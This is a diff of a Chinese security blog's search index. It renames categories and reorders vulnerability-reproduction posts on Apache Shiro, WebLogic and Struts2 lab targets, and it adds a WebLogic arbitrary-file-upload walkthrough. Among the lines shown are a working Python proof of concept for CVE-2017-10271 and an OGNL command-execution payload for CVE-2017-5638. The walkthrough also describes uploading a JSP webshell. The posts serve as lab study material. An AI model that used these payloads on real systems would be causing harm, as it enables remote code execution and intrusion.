@@ -2,7 +2,7 @@
 <search>
   <entry>
     <title>Shiro rememberMe反序列化漏洞复现过程（Shiro-550）</title>
-    <url>/2020/08/06/Vulfocus%E9%9D%B6%E5%9C%BA/Shiro%20rememberMe%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B%EF%BC%88Shiro-550%EF%BC%89/</url>
+    <url>/2020/08/06/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Shiro%20rememberMe%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B%EF%BC%88Shiro-550%EF%BC%89/</url>
     <content><![CDATA[<p>Apache Shiro是一个强大易用的Java安全框架，提供了认证、授权、加密和会话管理等功能。Shiro框架直观、易用，同时也能提供健壮的安全性。</p>
 <h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录成功后会生成经过加密并编码的cookie。在服务端对rememberMe的cookie值，先base64解码然后AES解密再反序列化，就导致了反序列化RCE漏洞。</p>
 <p>那么，Payload产生的过程：</p>
@@ -91,15 +91,41 @@
 <p>检查安装情况<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020080610.png" alt="image"></p>
 ]]></content>
       <categories>
-        <category>vulfocus靶场练习</category>
+        <category>漏洞复现</category>
       </categories>
       <tags>
         <tag>Apache Shiro</tag>
       </tags>
   </entry>
   <entry>
+    <title>WebLogic任意文件上传漏洞复现（CVE-2018-2894）</title>
+    <url>/2020/09/27/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/WebLogic%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88CVE-2018-2894%EF%BC%89/</url>
+    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Oracle官方发布了7月份的关键补丁更新CPU（Critical Patch Update）,其中包含一个高危的Weblogic未授权任意文件上传漏洞(CVE-2018-2894)</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Oracle WebLogic Server，版本<strong>10.3.6.0，12.1.3.0，12.2.1.2，12.2.1.3</strong>。 </p>
+<p>该漏洞的影响模块为web服务测试页，在默认情况下不启用。 受影响的页面为 <strong>/ws_utc/config.do</strong> 和 <strong>/ws_utc/begin.do</strong></p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>使用vulhub搭建漏洞环境</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd vulhub&#x2F;weblogic&#x2F;CVE-2018-2894</span><br><span class="line"></span><br><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+<p>直接访问存在漏洞的页面<strong><a href="http://47.101.62.20:7001/ws_utc/config.do">http://47.101.62.20:7001/ws_utc/config.do</a></strong><br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092706.png" alt="image"></p>
+<p>将目录设置为<strong>ws_utc</strong>应用的静态文件css目录，访问这个目录是无需权限的,可以直接进行访问上传的文件</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;u01&#x2F;oracle&#x2F;user_projects&#x2F;domains&#x2F;base_domain&#x2F;servers&#x2F;AdminServer&#x2F;tmp&#x2F;_WL_internal&#x2F;com.oracle.webservices.wls.ws-testclient-app-wls&#x2F;4mcj4y&#x2F;war&#x2F;css</span><br></pre></td></tr></table></figure>
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092707.png" alt="image"></p>
+<p>打开安全页面，然后上传<strong>webshell</strong>，并且获取时间戳<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092708.png" alt="image"><br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092709.png" alt="image"></p>
+<p>访问上传的jsp马</p>
+<blockquote>
+<p>具体格式为 <a href="http://your-ip:7001/ws_utc/css/config/keystore/[%E6%97%B6%E9%97%B4%E6%88%B3]_[%E6%96%87%E4%BB%B6%E5%90%8D]">http://your-ip:7001/ws_utc/css/config/keystore/[时间戳]_[文件名]</a></p>
+</blockquote>
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092710.png" alt="image"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>WebLogic</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>WebLogic反序列化漏洞复现（CVE-2017-10271）</title>
-    <url>/2020/09/27/Vulfocus%E9%9D%B6%E5%9C%BA/WebLogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88CVE-2017-10271%EF%BC%89/</url>
+    <url>/2020/09/27/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/WebLogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88CVE-2017-10271%EF%BC%89/</url>
     <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>CVE-2017-10271漏洞产生的原因大致是Weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。攻击者发送精心构造的xml数据甚至能通过反弹shell拿到权限</p>
 <h2 id="受影响版本"><a href="#受影响版本" class="headerlink" title="受影响版本"></a>受影响版本</h2><p>10.3.6.0.0，12.1.3.0.0，12.2.1.1.0，12.2.1.2.0</p>
 <h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>使用vulfoces搭建漏洞环境</p>
@@ -117,7 +143,7 @@
 <p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020092705.png" alt="image"></p>
 <h2 id="poc验证脚本"><a href="#poc验证脚本" class="headerlink" title="poc验证脚本"></a>poc验证脚本</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"># coding:utf-8</span><br><span class="line"> </span><br><span class="line">import requests</span><br><span class="line">from sys import argv</span><br><span class="line"> </span><br><span class="line">headers &#x3D; &#123;</span><br><span class="line">	&#39;User-Agent&#39;:&#39;Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko&#x2F;20100101 Firefox&#x2F;48.0&#39;,</span><br><span class="line">	&#39;Accept&#39;: &#39;text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8&#39;,</span><br><span class="line">	&#39;Upgrade-Insecure-Requests&#39;: &#39;1&#39;,</span><br><span class="line">	&#39;Content-Type&#39;: &#39;text&#x2F;xml&#39;</span><br><span class="line">    &#125;</span><br><span class="line">def Webogic_XMLDecoder_poc(url):</span><br><span class="line">	#url&#x3D;&quot;http:&#x2F;&#x2F;47.101.62.20:27036&quot;</span><br><span class="line">	posturl&#x3D;url+&#39;&#x2F;wls-wsat&#x2F;CoordinatorPortType&#39;</span><br><span class="line">	data &#x3D; &#39;&#39;&#39;</span><br><span class="line">	&lt;soapenv:Envelope xmlns:soapenv&#x3D;&quot;http:&#x2F;&#x2F;schemas.xmlsoap.org&#x2F;soap&#x2F;envelope&#x2F;&quot;&gt;</span><br><span class="line">		&lt;soapenv:Header&gt;</span><br><span class="line">			&lt;work:WorkContext xmlns:work&#x3D;&quot;http:&#x2F;&#x2F;bea.com&#x2F;2004&#x2F;06&#x2F;soap&#x2F;workarea&#x2F;&quot;&gt;</span><br><span class="line">				&lt;java version&#x3D;&quot;1.6.0&quot; class&#x3D;&quot;java.beans.XMLDecoder&quot;&gt;</span><br><span class="line">					&lt;object class&#x3D;&quot;java.io.PrintWriter&quot;&gt; </span><br><span class="line">						&lt;string&gt;servers&#x2F;AdminServer&#x2F;tmp&#x2F;_WL_internal&#x2F;wls-wsat&#x2F;54p17w&#x2F;war&#x2F;test.txt&lt;&#x2F;string&gt;&lt;void method&#x3D;&quot;println&quot;&gt;</span><br><span class="line">						&lt;string&gt;xmldecoder_vul_test&lt;&#x2F;string&gt;&lt;&#x2F;void&gt;&lt;void method&#x3D;&quot;close&quot;&#x2F;&gt;</span><br><span class="line">					&lt;&#x2F;object&gt;</span><br><span class="line">				&lt;&#x2F;java&gt;</span><br><span class="line">			&lt;&#x2F;work:WorkContext&gt;</span><br><span class="line">		&lt;&#x2F;soapenv:Header&gt;</span><br><span class="line">		&lt;soapenv:Body&#x2F;&gt;</span><br><span class="line">	&lt;&#x2F;soapenv:Envelope&gt;</span><br><span class="line">    &#39;&#39;&#39;</span><br><span class="line">	</span><br><span class="line">	print url</span><br><span class="line">	try:</span><br><span class="line">		r&#x3D;requests.post(posturl,data&#x3D;data,headers&#x3D;headers,timeout&#x3D;5)</span><br><span class="line">		geturl&#x3D;url+&quot;&#x2F;wls-wsat&#x2F;test.txt&quot;</span><br><span class="line">		#print geturl</span><br><span class="line">		check_result &#x3D; requests.get(geturl,headers&#x3D;headers,timeout&#x3D;5)</span><br><span class="line">		if &#39;xmldecoder_vul_test&#39; in check_result.text:</span><br><span class="line">			print u&quot;存在WebLogic WLS远程执行漏洞(CVE-2017-10271)&quot;</span><br><span class="line">	except:</span><br><span class="line">		pass</span><br><span class="line"> </span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">	if len(argv) &#x3D;&#x3D; 1:</span><br><span class="line">		print &quot;Please input python Webogic_XMLDecoder_poc.py http:&#x2F;&#x2F;xxxx:7001&quot;</span><br><span class="line">		exit(0)</span><br><span class="line">	else:</span><br><span class="line">		url &#x3D; argv[1]</span><br><span class="line">	Webogic_XMLDecoder_poc(url)</span><br></pre></td></tr></table></figure>]]></content>
       <categories>
-        <category>vulfocus靶场练习</category>
+        <category>漏洞复现</category>
       </categories>
       <tags>
         <tag>WebLogic</tag>
@@ -751,33 +777,6 @@
       </tags>
   </entry>
   <entry>
-    <title>APP反编译-下载源码</title>
-    <url>/2020/08/16/APP%E6%B8%97%E9%80%8F/APP%E5%8F%8D%E7%BC%96%E8%AF%91-%E4%B8%8B%E8%BD%BD%E6%BA%90%E7%A0%81/</url>
-    <content><![CDATA[<h2 id="dex2jar工具"><a href="#dex2jar工具" class="headerlink" title="dex2jar工具"></a>dex2jar工具</h2><ol>
-<li>下载<a href="https://sourceforge.net/projects/dex2jar/">https://sourceforge.net/projects/dex2jar/</a></li>
-<li>解压<strong>dex2jar.jar</strong>文件</li>
-<li>将<strong>shini.apk</strong>文件后缀名修改为.rar然后解压<a id="more"></a></li>
-<li>把解压后目录下的<strong>classes.dex</strong>文件复制到<strong>dex2jar</strong>解压后的文件夹中（<strong>classes.dex</strong>文件与<strong>d2j-dex2jar.bat</strong>文件同在一个目录中）<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081601.png" alt="image"></li>
-<li>进入<strong>dex2jar</strong>目录下执行如下命令会生成<strong>classes-dex2jar.jar</strong>文件<blockquote>
-<p>d2j-dex2jar.bat classes.dex</p>
-</blockquote>
-</li>
-</ol>
-<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081602.png" alt="image"></p>
-<h2 id="jd-gui工具"><a href="#jd-gui工具" class="headerlink" title="jd-gui工具"></a>jd-gui工具</h2><ol>
-<li>下载<a href="https://links.jianshu.com/go?to=http://jd.benow.ca/">https://links.jianshu.com/go?to=http%3A%2F%2Fjd.benow.ca%2F</a></li>
-<li>双击打开<strong>jd-gui</strong>将<strong>classes-dex2jar.jar</strong>文件拖入即可<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081603.png" alt="image"></li>
-<li>点击<strong>File</strong>，然后<strong>Save All Sources</strong>将<strong>class</strong>文件编译为<strong>java</strong>源文件</li>
-</ol>
-]]></content>
-      <categories>
-        <category>APP渗透</category>
-      </categories>
-      <tags>
-        <tag>APP反编译</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>APP之反编译+目录结构+重新打包+重新签名</title>
     <url>/2020/08/16/APP%E6%B8%97%E9%80%8F/APP%E4%B9%8B%E5%8F%8D%E7%BC%96%E8%AF%91+%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84+%E9%87%8D%E6%96%B0%E6%89%93%E5%8C%85+%E9%87%8D%E6%96%B0%E7%AD%BE%E5%90%8D/</url>
     <content><![CDATA[<h2 id="反编译和重新打包-apktool"><a href="#反编译和重新打包-apktool" class="headerlink" title="反编译和重新打包-apktool"></a>反编译和重新打包-apktool</h2><p>下载地址：<a href="https://ibotpeaches.github.io/Apktool/install/">https://ibotpeaches.github.io/Apktool/install/</a></p>
@@ -801,6 +800,33 @@
 <li><strong>META-INF</strong>：apk的签名信息</li>
 </ol>
 <h2 id="APP重新签名"><a href="#APP重新签名" class="headerlink" title="APP重新签名"></a>APP重新签名</h2><p>参考文章：<a href="https://blog.csdn.net/lyq8479/article/details/6401093">Android应用程序签名详解</a></p>
+]]></content>
+      <categories>
+        <category>APP渗透</category>
+      </categories>
+      <tags>
+        <tag>APP反编译</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>APP反编译-下载源码</title>
+    <url>/2020/08/16/APP%E6%B8%97%E9%80%8F/APP%E5%8F%8D%E7%BC%96%E8%AF%91-%E4%B8%8B%E8%BD%BD%E6%BA%90%E7%A0%81/</url>
+    <content><![CDATA[<h2 id="dex2jar工具"><a href="#dex2jar工具" class="headerlink" title="dex2jar工具"></a>dex2jar工具</h2><ol>
+<li>下载<a href="https://sourceforge.net/projects/dex2jar/">https://sourceforge.net/projects/dex2jar/</a></li>
+<li>解压<strong>dex2jar.jar</strong>文件</li>
+<li>将<strong>shini.apk</strong>文件后缀名修改为.rar然后解压<a id="more"></a></li>
+<li>把解压后目录下的<strong>classes.dex</strong>文件复制到<strong>dex2jar</strong>解压后的文件夹中（<strong>classes.dex</strong>文件与<strong>d2j-dex2jar.bat</strong>文件同在一个目录中）<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081601.png" alt="image"></li>
+<li>进入<strong>dex2jar</strong>目录下执行如下命令会生成<strong>classes-dex2jar.jar</strong>文件<blockquote>
+<p>d2j-dex2jar.bat classes.dex</p>
+</blockquote>
+</li>
+</ol>
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081602.png" alt="image"></p>
+<h2 id="jd-gui工具"><a href="#jd-gui工具" class="headerlink" title="jd-gui工具"></a>jd-gui工具</h2><ol>
+<li>下载<a href="https://links.jianshu.com/go?to=http://jd.benow.ca/">https://links.jianshu.com/go?to=http%3A%2F%2Fjd.benow.ca%2F</a></li>
+<li>双击打开<strong>jd-gui</strong>将<strong>classes-dex2jar.jar</strong>文件拖入即可<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081603.png" alt="image"></li>
+<li>点击<strong>File</strong>，然后<strong>Save All Sources</strong>将<strong>class</strong>文件编译为<strong>java</strong>源文件</li>
+</ol>
 ]]></content>
       <categories>
         <category>APP渗透</category>
@@ -844,28 +870,8 @@
       </tags>
   </entry>
   <entry>
-    <title>S2-046 CVE-2017-5638复现过程</title>
-    <url>/2020/08/14/Vulfocus%E9%9D%B6%E5%9C%BA/S2-046%20CVE-2017-5638%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
-    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>在使用基于Jakarta插件的文件上传功能时，有可能存在远程命令执行，导致系统被黑客入侵。恶意用户可在上传文件时通过修改HTTP请求头中的Content-Type值来触发该漏洞，进而执行系统命令。</p>
-<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts2.3.5 – 2.3.31    Struts2.5 – 2.5.10</p>
-<a id="more"></a>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><ol>
-<li><p>使用vulfocus启动环境<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081405.png" alt="image"></p>
-</li>
-<li><p>直接使用工具拿到flag<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081406.png" alt="image"></p>
-</li>
-</ol>
-]]></content>
-      <categories>
-        <category>vulfocus靶场练习</category>
-      </categories>
-      <tags>
-        <tag>Struts2</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>S2-029 CVE-2016-0785复现过程</title>
-    <url>/2020/08/14/Vulfocus%E9%9D%B6%E5%9C%BA/S2-029%20CVE-2016-0785%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
+    <url>/2020/08/14/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/S2-029%20CVE-2016-0785%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
     <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Struts2的标签库使用OGNL表达式来访问ActionContext中的对象数据。为了能够访问到ActionContext中的变量，Struts2将ActionContext设置为OGNL的上下文，并将OGNL的跟对象加入ActionContext中。<br>在Struts2中，如下的标签就调用了OGNL进行取值。</p>
 <a id="more"></a>
 
@@ -882,7 +888,7 @@
 <p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081404.png" alt="image"></p>
 ]]></content>
       <categories>
-        <category>vulfocus靶场练习</category>
+        <category>漏洞复现</category>
       </categories>
       <tags>
         <tag>Struts2</tag>
@@ -890,7 +896,7 @@
   </entry>
   <entry>
     <title>S2-019 CVE-2013-4316复现过程</title>
-    <url>/2020/08/14/Vulfocus%E9%9D%B6%E5%9C%BA/S2-019%20CVE-2013-4316%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
+    <url>/2020/08/14/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/S2-019%20CVE-2013-4316%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
     <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>要求开发者模式，且poc第一个参数是debug，触发点在DebuggingInterceptor上，查看intercept函数，从debug参数获取调试模式，如果模式是command，则把expression参数放到stack.findValue中，最终放到了ognl.getValue中</p>
 <h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.0.0 - 2.3.15.1</p>
 <a id="more"></a>
@@ -900,7 +906,27 @@
 </ol>
 ]]></content>
       <categories>
-        <category>vulfocus靶场练习</category>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Struts2</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>S2-046 CVE-2017-5638复现过程</title>
+    <url>/2020/08/14/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/S2-046%20CVE-2017-5638%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
+    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>在使用基于Jakarta插件的文件上传功能时，有可能存在远程命令执行，导致系统被黑客入侵。恶意用户可在上传文件时通过修改HTTP请求头中的Content-Type值来触发该漏洞，进而执行系统命令。</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts2.3.5 – 2.3.31    Struts2.5 – 2.5.10</p>
+<a id="more"></a>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><ol>
+<li><p>使用vulfocus启动环境<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081405.png" alt="image"></p>
+</li>
+<li><p>直接使用工具拿到flag<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081406.png" alt="image"></p>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
       </categories>
       <tags>
         <tag>Struts2</tag>
@@ -908,7 +934,7 @@
   </entry>
   <entry>
     <title>S2-048 CVE-2017-9791复现过程</title>
-    <url>/2020/08/14/Vulfocus%E9%9D%B6%E5%9C%BA/S2-048%20CVE-2017-9791%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
+    <url>/2020/08/14/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/S2-048%20CVE-2017-9791%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
     <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Apache Struts 1插件的Apache Struts 2.3.X版本中存在远程代码执行漏洞,该漏洞出现于Struts2的某个类中，该类是为了将Struts1中的Action包装成为Struts2中的Action，以保证Struts2的兼容性。在Struts2中的Struts1插件启用的情况下，远程攻击者可通过使用恶意字段值，构造特定的输入，发送到ActionMessage类中，从而导致任意命令执行，进而获取目标主机系统权限</p>
 <h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Apache Struts 2.3.x系列中启用了struts2-struts1-plugin插件的版本</p>
 <a id="more"></a>
@@ -926,7 +952,7 @@
 <p>或直接使用工具<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081409.png" alt="image"></p>
 ]]></content>
       <categories>
-        <category>vulfocus靶场练习</category>
+        <category>漏洞复现</category>
       </categories>
       <tags>
         <tag>Struts2</tag>
@@ -934,7 +960,7 @@
   </entry>
   <entry>
     <title>S2-052 CVE-2017-9805复现过程</title>
-    <url>/2020/08/14/Vulfocus%E9%9D%B6%E5%9C%BA/S2-052%20CVE-2017-9805%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
+    <url>/2020/08/14/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/S2-052%20CVE-2017-9805%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
     <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Struts2 REST插件的XStream组件存在反序列化漏洞，使用XStream组件对XML格式的数据包进行反序列化操作时，未对数据内容进行有效验证，可被远程攻击。</p>
 <h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.1.2 - Struts 2.3.33<br>Struts 2.5 - Struts 2.5.12</p>
 <a id="more"></a>
@@ -946,7 +972,7 @@
 </ol>
 ]]></content>
       <categories>
-        <category>vulfocus靶场练习</category>
+        <category>漏洞复现</category>
       </categories>
       <tags>
         <tag>Struts2</tag>
@@ -954,7 +980,7 @@
   </entry>
   <entry>
     <title>S2-053 CVE-2017-12611复现过程</title>
-    <url>/2020/08/14/Vulfocus%E9%9D%B6%E5%9C%BA/S2-053%20CVE-2017-12611%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
+    <url>/2020/08/14/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/S2-053%20CVE-2017-12611%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
     <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Struts2在使用Freemarker模板引擎的时候，同时允许解析OGNL表达式。导致用户输入的数据本身不会被OGNL解析，但由于被Freemarker解析一次后变成离开一个表达式，被OGNL解析第二次，导致任意命令执行漏洞。</p>
 <h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.0.1-2.3.33<br>Struts 2.5-2.5.10</p>
 <a id="more"></a>
@@ -969,29 +995,7 @@
 </ol>
 ]]></content>
       <categories>
-        <category>vulfocus靶场练习</category>
-      </categories>
-      <tags>
-        <tag>Struts2</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>S2-057 CVE-2018-11776复现过程</title>
-    <url>/2020/08/14/Vulfocus%E9%9D%B6%E5%9C%BA/S2-057%20CVE-2018-11776%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
-    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>alwaysSelectFullNamespace为true。<br>action元素没有设置namespace属性，或者使用了通配符。<br>命名空间将由用户从url传递并解析为OGNL表达式，最终导致远程代码执行漏洞</p>
-<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.3–2.3.34<br>Struts2.5–2.5.16</p>
-<a id="more"></a>
-<h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol>
-<li><p>使用vulfocus搭建漏洞环境<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081414.png" alt="image"></p>
-</li>
-<li><p>poc利用</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;index&#x2F;%24%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23a%3D%40java.lang.Runtime%40getRuntime%28%29.exec%28%27id%27%29%29.%28%40org.apache.commons.io.IOUtils%40toString%28%23a.getInputStream%28%29%29%29%7D&#x2F;actionChain1.action</span><br></pre></td></tr></table></figure>
-<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081415.png" alt="image"></p>
-</li>
-</ol>
-]]></content>
-      <categories>
-        <category>vulfocus靶场练习</category>
+        <category>漏洞复现</category>
       </categories>
       <tags>
         <tag>Struts2</tag>
@@ -999,7 +1003,7 @@
   </entry>
   <entry>
     <title>S2-059 CVE-2019-0230复现过程</title>
-    <url>/2020/08/14/Vulfocus%E9%9D%B6%E5%9C%BA/S2-059%20CVE-2019-0230%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
+    <url>/2020/08/14/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/S2-059%20CVE-2019-0230%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
     <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Apache Struts于2020年8月13日披露 S2-059 Struts 远程代码执行漏洞（CVE-2019-0230），在使用某些tag等情况下可能存在OGNL表达式注入漏洞，从而造成远程代码执行，风险极大。腾讯安全专家提醒Apache Struts用户尽快升级到2.5.22或以上版本，避免遭遇黑客攻击。    </p>
 <p>Apache Struts2框架是一个用于开发Java EE网络应用程序的Web框架，应用十分广泛。</p>
 <h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Apache Struts 2.0.0 - 2.5.20</p>
@@ -1015,7 +1019,29 @@
 <p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081417.png" alt="image"></p>
 ]]></content>
       <categories>
-        <category>vulfocus靶场练习</category>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Struts2</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>S2-057 CVE-2018-11776复现过程</title>
+    <url>/2020/08/14/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/S2-057%20CVE-2018-11776%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
+    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>alwaysSelectFullNamespace为true。<br>action元素没有设置namespace属性，或者使用了通配符。<br>命名空间将由用户从url传递并解析为OGNL表达式，最终导致远程代码执行漏洞</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.3–2.3.34<br>Struts2.5–2.5.16</p>
+<a id="more"></a>
+<h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol>
+<li><p>使用vulfocus搭建漏洞环境<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081414.png" alt="image"></p>
+</li>
+<li><p>poc利用</p>
